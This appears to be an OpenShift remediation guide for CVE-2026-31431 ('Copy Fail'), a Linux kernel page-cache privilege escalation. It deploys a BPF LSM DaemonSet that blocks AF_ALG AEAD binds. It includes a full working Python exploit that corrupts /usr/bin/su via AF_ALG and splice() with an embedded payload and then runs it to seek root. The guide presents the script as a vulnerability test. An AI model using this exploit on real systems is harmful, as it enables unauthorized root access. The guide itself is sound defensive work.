## Summary

CVE-2026-31431 ("Copy Fail") is a Linux kernel privilege escalation vulnerability
in the `algif_aead` cryptographic interface. An attacker uses AF\_ALG sockets with
the `authencesn` algorithm and `splice()` to corrupt arbitrary files in the kernel
page cache — including setuid binaries like `/usr/bin/su`.

This document provides a **zero-reboot remediation** using a BPF LSM DaemonSet
that blocks all AF_ALG AEAD binds — the subsystem exploited by Copy Fail. This
prevents bypasses via crypto template nesting (e.g. `pcrypt(authencesn(...))`).
Other AF_ALG usage (hash, skcipher) is unaffected. Tested end-to-end on three
separate OCP 4.22 clusters.

## Quick Start

```bash
# 1. Verify BPF LSM is enabled (RHEL CoreOS 9.8 has it by default)
oc debug node/<any-node> -- chroot /host cat /sys/kernel/security/lsm
# Must contain "bpf"

# 2. Deploy the namespace and grant privileged SCC
oc apply -f daemonset.yaml

# 3. DaemonSet pods will start automatically on all nodes

# 4. Verify
oc get pods -n block-copyfail     # All nodes should show Running
oc logs -n block-copyfail -l app=block-copyfail
# Expected: "block-copyfail: blocker active — all AF_ALG AEAD binds blocked"
```

No reboots. No node drains. No pod restarts. Protection is immediate and
covers all processes on all nodes (100% coverage).

## Table of Contents

1. [How the Exploit Works](#how-the-exploit-works)
2. [Confirming Vulnerability on Your Cluster](#confirming-vulnerability-on-your-cluster)
3. [BPF LSM DaemonSet Deployment](#bpf-lsm-daemonset-deployment)
4. [Post-Deployment Verification](#post-deployment-verification)
5. [Building the Image from Source](#building-the-image-from-source)
6. [Removal](#removal)

---

## How the Exploit Works

The exploit chains three kernel features:

1. **AF\_ALG socket** — creates a userspace handle to kernel crypto via
   `socket(AF_ALG, SOCK_SEQPACKET, 0)`
2. **AEAD bind** — binds to `authencesn(hmac(sha256),cbc(aes))`, a specific
   authenticated encryption algorithm
3. **splice() + sendmsg()** — the kernel incorrectly performs an "in-place"
   operation where source and destination page mappings differ, corrupting the
   page cache of a read-only file

The attacker corrupts `/usr/bin/su` in the page cache (without write access to
the file), then executes it to gain root.

---

## Confirming Vulnerability on Your Cluster

### Step 1: Save the test script

Save the following as `cve_test.py`. It reproduces the original exploit's page
cache corruption against `/usr/bin/su` using the same payload. The corruption
only affects the container's overlayfs copy, not the host.

```python
#!/usr/bin/env python3
"""CVE-2026-31431 vulnerability test targeting /usr/bin/su."""
import os, sys, socket, hashlib, zlib, ctypes, ctypes.util, subprocess

libc = ctypes.CDLL(ctypes.util.find_library("c"))
libc.splice.argtypes = [
    ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
    ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
    ctypes.c_size_t, ctypes.c_uint,
]
libc.splice.restype = ctypes.c_longlong

def _splice(fd_in, fd_out, length, offset_src=None):
    if offset_src is not None:
        off = ctypes.c_longlong(offset_src)
        return libc.splice(fd_in, ctypes.byref(off), fd_out, None, length, 0)
    return libc.splice(fd_in, None, fd_out, None, length, 0)

def d(x):
    return bytes.fromhex(x)

def try_corrupt(fd, offset, payload):
    SOL_ALG = 279
    try:
        a = socket.socket(38, 5, 0)
    except OSError as e:
        print(f"  AF_ALG socket creation failed: {e}")
        return False
    try:
        a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    except OSError as e:
        print(f"  AF_ALG bind failed: {e}")
        a.close()
        return False
    try:
        a.setsockopt(SOL_ALG, 1, d('0800010000000010' + '0' * 64))
        a.setsockopt(SOL_ALG, 5, None, 4)
        u, _ = a.accept()
        o = offset + 4
        z = d('00')
        u.sendmsg(
            [b"A" * 4 + payload],
            [(SOL_ALG, 3, z * 4),
             (SOL_ALG, 2, b'\x10' + z * 19),
             (SOL_ALG, 4, b'\x08' + z * 3)],
            32768,
        )
        r, w = os.pipe()
        _splice(fd, w, o, offset_src=0)
        _splice(r, u.fileno(), o)
        try:
            u.recv(8 + offset)
        except Exception:
            pass
        os.close(r)
        os.close(w)
        u.close()
    except OSError as e:
        print(f"  Exploit step failed: {e}")
        a.close()
        return False
    a.close()
    return True

TARGET = "/usr/bin/su"
print("=== CVE-2026-31431 Vulnerability Test ===")
print(f"Target: {TARGET}")
print()

with open(TARGET, "rb") as f:
    orig_hash = hashlib.sha256(f.read()).hexdigest()
print(f"Original SHA256: {orig_hash}")

payload = zlib.decompress(d(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

fd = os.open(TARGET, os.O_RDONLY)
i = 0
ok = True
print(f"Attempting splice + AF_ALG page-cache corruption "
      f"({len(payload)} bytes in {len(payload)//4} chunks)...")
while i < len(payload):
    if not try_corrupt(fd, i, payload[i:i+4]):
        ok = False
        break
    i += 4
os.close(fd)

if not ok:
    print()
    print("RESULT: CANNOT TEST - AF_ALG or splice not available/permitted")
    sys.exit(2)

with open(TARGET, "rb") as f:
    after_hash = hashlib.sha256(f.read()).hexdigest()
print(f"After SHA256:    {after_hash}")
print()

if orig_hash != after_hash:
    print("PAGE CACHE CORRUPTION: YES - /usr/bin/su was modified in the page cache")
else:
    print("PAGE CACHE CORRUPTION: NO - /usr/bin/su is intact")
    print()
    print("RESULT: NOT VULNERABLE")
    sys.exit(0)

print()
print("Attempting to execute corrupted /usr/bin/su ...")
try:
    r = subprocess.run([TARGET, "-c", "id"], capture_output=True, timeout=5)
    stdout = r.stdout.decode(errors="replace").strip()
    stderr = r.stderr.decode(errors="replace").strip()
    print(f"  exit code: {r.returncode}")
    if stdout:
        print(f"  stdout: {stdout}")
    if stderr:
        print(f"  stderr: {stderr}")
    if "uid=0" in stdout:
        print()
        print("RESULT: FULLY EXPLOITABLE - gained root via corrupted su")
    else:
        print()
        print("RESULT: PARTIALLY MITIGATED")
        print("  Page-cache corruption succeeded (kernel is vulnerable)")
        print("  Privilege escalation blocked (allowPrivilegeEscalation=false)")
except Exception as e:
    print(f"  execution failed: {e}")
    print()
    print("RESULT: PARTIALLY MITIGATED")
    print("  Page-cache corruption succeeded (kernel is vulnerable)")
    print("  Corrupted binary could not execute")
```

### Step 2: Run the test on your cluster

```bash
oc create namespace cve-test
oc create configmap cve-test-script -n cve-test --from-file=cve_test.py

cat <<'EOF' | oc apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: cve-test
  namespace: cve-test
  annotations:
    openshift.io/required-scc: restricted-v2
spec:
  restartPolicy: Never
  containers:
  - name: test
    image: registry.access.redhat.com/ubi9/python-39:latest
    command: ["python3", "/scripts/cve_test.py"]
    volumeMounts:
    - name: script
      mountPath: /scripts
      readOnly: true
  volumes:
  - name: script
    configMap:
      name: cve-test-script
EOF
```

### Step 3: Check the results

```bash
oc wait pod/cve-test -n cve-test \
  --for=jsonpath='{.status.phase}'=Succeeded --timeout=120s
oc logs -n cve-test cve-test
```

**On a vulnerable cluster** you will see:

```
=== CVE-2026-31431 Vulnerability Test ===
Target: /usr/bin/su

Original SHA256: 8969560ae8e6e21c6184c1451f59418822ee69dd5d946d71987b55236bbc0feb
Attempting splice + AF_ALG page-cache corruption (160 bytes in 40 chunks)...
After SHA256:    30b0f5b5a054c4df65b48ca792863bf7054b4d793f15f57163792ba6c2b151ae

PAGE CACHE CORRUPTION: YES - /usr/bin/su was modified in the page cache

Attempting to execute corrupted /usr/bin/su ...
  exit code: 0

RESULT: PARTIALLY MITIGATED
  Page-cache corruption succeeded (kernel is vulnerable)
  Privilege escalation blocked (allowPrivilegeEscalation=false)
```

### Step 4: Clean up

```bash
oc delete namespace cve-test
```

---

## BPF LSM DaemonSet Deployment

The BPF LSM approach hooks `socket_bind` at the kernel level and blocks all
AF_ALG AEAD binds regardless of template nesting. It is based on
[block-copyfail](https://github.com/atgreen/block-copyfail), rewritten in C
with libbpf for OCP deployment.

### Prerequisites

BPF LSM must be enabled. RHEL CoreOS 9.8 (OCP 4.22) has it enabled by default.
Verify with:

```bash
oc debug node/<any-node> -- chroot /host cat /sys/kernel/security/lsm
```

Expected output includes `bpf`:

```
lockdown,capability,landlock,yama,selinux,bpf
```

If `bpf` is **not** present, a one-time MachineConfig is needed (this is the
only scenario requiring a reboot):

```yaml
apiVersion: machineconfiguration.openshift.io/v1
kind: MachineConfig
metadata:
  labels:
    machineconfiguration.openshift.io/role: worker
  name: 99-enable-bpf-lsm
spec:
  kernelArguments:
    - lsm=lockdown,capability,selinux,bpf
```

### Step 1: Create the namespace, grant the SCC, and deploy

The privileged SCC must be granted before the DaemonSet pods are created,
otherwise pod creation will fail with SCC validation errors.

```bash
# Create the namespace
cat <<'EOF' | oc apply -f -
apiVersion: v1
kind: Namespace
metadata:
  name: block-copyfail
  labels:
    pod-security.kubernetes.io/enforce: privileged
    pod-security.kubernetes.io/audit: privileged
    pod-security.kubernetes.io/warn: privileged
EOF

# Grant privileged SCC to the default service account
oc adm policy add-scc-to-user privileged -z default -n block-copyfail

# Deploy the DaemonSet
cat <<'EOF' | oc apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: block-copyfail
  namespace: block-copyfail
  labels:
    app: block-copyfail
spec:
  selector:
    matchLabels:
      app: block-copyfail
  template:
    metadata:
      labels:
        app: block-copyfail
    spec:
      priorityClassName: system-node-critical
      tolerations:
      - operator: Exists
      containers:
      - name: blocker
        image: quay.io/mrunalp/block-copyfail:latest
        securityContext:
          privileged: true
        volumeMounts:
        - name: bpf
          mountPath: /sys/fs/bpf
        - name: btf
          mountPath: /sys/kernel/btf/vmlinux
          readOnly: true
        resources:
          requests:
            cpu: 10m
            memory: 32Mi
          limits:
            cpu: 100m
            memory: 64Mi
      volumes:
      - name: bpf
        hostPath:
          path: /sys/fs/bpf
          type: DirectoryOrCreate
      - name: btf
        hostPath:
          path: /sys/kernel/btf/vmlinux
          type: File
      terminationGracePeriodSeconds: 5
EOF
```

### Step 2: Wait for pods to start on all nodes

```bash
oc get pods -n block-copyfail -o wide
```

Expected: one pod per node, all `Running`:

```
NAME                   READY   STATUS    AGE   NODE
block-copyfail-2jhzf   1/1     Running   34s   ci-...-master-2
block-copyfail-4dfq7   1/1     Running   34s   ci-...-master-1
block-copyfail-c2ts8   1/1     Running   34s   ci-...-worker-c
block-copyfail-ctblk   1/1     Running   34s   ci-...-worker-a
block-copyfail-m26sx   1/1     Running   34s   ci-...-worker-b
block-copyfail-xsh6d   1/1     Running   34s   ci-...-master-0
```

### Step 3: Verify the blocker is active

```bash
oc logs -n block-copyfail -l app=block-copyfail
```

Expected:

```
block-copyfail: blocker active — all AF_ALG AEAD binds blocked
```

---

## Post-Deployment Verification

Re-run the same exploit test from the [Confirming Vulnerability](#confirming-vulnerability-on-your-cluster) section.

**After deploying the BPF LSM DaemonSet**, the output will be:

```
=== CVE-2026-31431 Vulnerability Test ===
Target: /usr/bin/su

Original SHA256: 30b0f5b5a054c4df65b48ca792863bf7054b4d793f15f57163792ba6c2b151ae
Attempting splice + AF_ALG page-cache corruption (160 bytes in 40 chunks)...
  AF_ALG bind failed: [Errno 1] Operation not permitted

RESULT: CANNOT TEST - AF_ALG or splice not available/permitted
```

The DaemonSet logs will show the blocked attempt:

```bash
oc logs -n block-copyfail -l app=block-copyfail
```

```
block-copyfail: blocker active — all AF_ALG AEAD binds blocked
block-copyfail: BLOCKED pid=16777    comm=python3 time=2026-05-01 16:37:23
```

### Verifying Other Algorithms Are Unaffected

Run `verify-algos.py` on a node to confirm that all AEAD algorithms are blocked
while other AF\_ALG types (hash, skcipher) continue to work:

```bash
oc debug node/<any-node> -- chroot /host python3 -c "
import socket
tests = [
    ('aead',     'gcm(aes)'),
    ('aead',     'ccm(aes)'),
    ('aead',     'rfc4106(gcm(aes))'),
    ('hash',     'sha256'),
    ('skcipher', 'cbc(aes)'),
    ('aead',     'authencesn(hmac(sha256),cbc(aes))'),
]
for t, n in tests:
    s = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
    try:
        s.bind((t, n))
        print(f'  ALLOWED  {t}/{n}')
    except OSError as e:
        print(f'  BLOCKED  {t}/{n} -- {e}')
    finally:
        s.close()
"
```

Expected output:

```
  BLOCKED  aead/gcm(aes) -- [Errno 1] Operation not permitted
  BLOCKED  aead/ccm(aes) -- [Errno 1] Operation not permitted
  BLOCKED  aead/rfc4106(gcm(aes)) -- [Errno 1] Operation not permitted
  ALLOWED  hash/sha256
  ALLOWED  skcipher/cbc(aes)
  BLOCKED  aead/authencesn(hmac(sha256),cbc(aes)) -- [Errno 1] Operation not permitted
```

This confirms the BPF LSM blocks all AEAD binds while leaving other AF_ALG types functional.

---

## Building the Image from Source

The BPF LSM blocker source is in `block-copyfail/`:

```
block-copyfail/
  block_copyfail.bpf.c     # BPF kernel program (LSM hook)
  block_copyfail.c          # Userspace loader (libbpf skeleton)
  block_copyfail.h          # Shared event struct
  Makefile                  # Build pipeline
  Dockerfile                # Multi-stage build
  daemonset.yaml            # Namespace + DaemonSet manifest
  trigger-test.py           # Quick validation script
```

Build and push:

```bash
cd block-copyfail/
podman build -t quay.io/<org>/block-copyfail:latest .
podman push quay.io/<org>/block-copyfail:latest
```

The Dockerfile uses a multi-stage build: Fedora with clang/bpftool/libbpf-devel
for compilation, UBI 9 minimal for the runtime image (~122 MB).

---

## Removal

Deleting the DaemonSet immediately removes the mitigation on all nodes:

```bash
oc delete -f daemonset.yaml
# or
oc delete namespace block-copyfail
```

The BPF program detaches automatically when the loader process exits. No reboot
or pod restart is needed.
